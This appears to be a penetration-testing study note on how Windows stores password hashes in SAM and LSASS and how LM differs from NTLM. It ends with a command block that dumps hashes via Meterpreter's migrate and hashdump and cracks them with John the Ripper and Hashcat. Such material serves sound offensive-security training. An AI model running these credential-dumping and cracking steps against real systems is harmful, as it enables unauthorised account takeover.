# 10 - Dumping & Cracking NTLM Hashes

### **Windows Password Hashes**

* The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
* Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
* Authentication and verification of user credentials facilitated by the Local Security Authority (LSA).
* Windows versions up to Windows Server 2003 utilize two different types of hashes:
  * LM
  * NTLM
* Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.

**SAM Database**

* SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
* The SAM database file cannot be copied while the operating system is running.
* The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
* In modern versions of Windows, the SAM database is encrypted with a syskey.
* Note: Elevated/Administrative privileges are required in order to access and interact with the LSASS process.

**NTLM (NTHash)**

* NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
* From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
* When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
* NTLM improves upon LM in the following ways:
  * Does not split the hash in to two chunks.
  * Case sensitive.
  * Allows the use of symbols and unicode characters.

### **Dumping & Cracking NTLM Hashes**

* We can dump Windows passwords hashes by leveraging various utilities like:
  * The inbuilt meterpreter “hashdump” command
  * Mimikatz
* After we have dumped the hashes, we can crack them through the use of the following utilities:
  * John The Ripper
  * Hashcat

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
meterpreter > pgrep lsass 
meterpreter > migrate <ID> # migrate into the lsass process to get a stable meterpreter session.
meterpreter > hashdump #Dump the hashes with meterpreter
#Copy the hashes and paste them in a .txt file.

john --list=formats #List the hash formats that JohnTheRipper can crack
john --format=<hashFormat> <hashFile> --wordlist=<wordlist> #Crack a hashwith JohnTheRipper (default JTH wordlist if wordlist flag isn't specified)
john --format=NT hashes.txt --wordlist=/usr/share....

john --show --format<hashFormat> <hashFile> # Show previously cracked passwords.

hashcat -a<attackMode> -m <hashMode> <hashFile> <wordlist>
hashcat -a 3 -m 1000 hashes.txt /wordlist_path # -a(attack-mode), -m(NTLM=1000).
hashcat <previousCommand> --show #Display previously cracked passwords.
```
{% endcode %}
